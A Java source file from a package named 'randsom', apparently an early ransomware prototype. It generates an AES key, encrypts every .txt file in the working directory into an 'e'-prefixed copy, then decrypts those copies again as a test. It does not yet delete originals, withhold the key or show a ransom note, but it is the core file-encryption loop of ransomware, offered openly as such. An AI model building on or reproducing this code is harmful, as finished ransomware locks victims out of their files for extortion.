package randsom;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.Arrays;
import java.util.HashSet;

import javax.swing.event.ListSelectionEvent;


public class fileReader {
	
	static chiper c;
	private static String aesKeyString;
	
	public static void main(String args[]) {
		
		c = new chiper();
		//rsaKeysGen();
		c.aesKeyGen();
		

		try {
			
			File dir = new File(System.getProperty("user.dir"));
			DataInputStream reader;
			DataOutputStream writer;
			File[] files = dir.listFiles();
			HashSet<String> types = new HashSet<>(Arrays.asList("txt"));
			for(File f : files) {
				if(f.isFile()) {
					String fileName = f.getName();
					String ext = fileName.substring(fileName.lastIndexOf('.') + 1);
					
					if(types.contains(ext)) {
						reader = new DataInputStream(new FileInputStream(f));
						int size = reader.available();
						System.out.print(size);
						byte[] data = new byte[size];
						reader.read(data);
						byte[] edata = c.encrypt(data);
						
						System.out.println(c.encode(Arrays.copyOf(data, 200)));
						System.out.println();
						System.out.println(c.encode(Arrays.copyOf(edata, 200)));
						reader.close();
						
						writer = new DataOutputStream( new FileOutputStream("e" + fileName));
						
						writer.write(edata);
						writer.flush();
						writer.close();
						
					}
				}
			}
				
			
		}
		catch(Exception ex) {}
		
		try {
			
			File dir = new File(System.getProperty("user.dir"));
			DataInputStream reader;
			DataOutputStream writer;
			File[] files = dir.listFiles();
			HashSet<String> types = new HashSet<>(Arrays.asList("txt"));
			for(File f : files) {
				if(f.isFile()) {
					String fileName = f.getName();
					String ext = fileName.substring(fileName.lastIndexOf('.') + 1);
					
					if(fileName.charAt(0) == 'e' && types.contains(ext)) {
						reader = new DataInputStream(new FileInputStream(f));
						int size = reader.available();
						System.out.print(size);
						byte[] data = new byte[size];
						reader.read(data);
						byte[] edata = c.decrypt(data);
						
						System.out.println(c.encode(Arrays.copyOf(data, 200)));
						System.out.println();
						System.out.println(c.encode(Arrays.copyOf(edata, 200)));
						reader.close();
						
						writer = new DataOutputStream( new FileOutputStream( "u" + fileName.substring(1)));
						
						writer.write(edata);
						writer.flush();
						writer.close();
						
					}
				}
			}
		}catch(Exception ex) {}
		
	}
}
